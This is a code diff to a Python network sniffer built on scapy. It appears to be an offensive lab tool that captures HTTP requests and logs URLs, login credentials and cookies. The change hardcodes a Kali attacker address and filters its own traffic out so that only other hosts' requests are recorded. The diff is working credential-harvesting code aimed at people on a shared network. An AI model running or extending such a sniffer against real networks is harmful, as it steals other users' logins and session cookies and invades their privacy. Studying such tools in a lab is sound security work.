@@ -24,6 +24,9 @@ from scapy_http import http
 from tools import create_directory, add_in_file
 
 
+kali_ip = "10.0.2.17"
+
+
 def sniff(interface):
     # possibility filter = (udp, arp, tcp, port 21, port 80)
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
@@ -45,15 +48,22 @@ def get_cookie(packet):
 def get_headers(packet):
     return str(packet[http.HTTPRequest].Headers)
 
+def get_ip(packet):
+    if packet.haslayer(scapy.IP):
+        src = str(packet[scapy.IP].src)
+        return src
+    return None
+
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
+    ip = get_ip(packet)
+    if packet.haslayer(http.HTTPRequest) and ip != kali_ip:
         print(packet.show())
 
         url = get_url(packet)
         url_print = "[+] HTTP Request >> " + str(url)
         print(url_print)
         add_in_file(data=url_print + "\n", file="url")
-
+        
         login_info = get_login(packet)
         if login_info is not None:
             print(login_info)
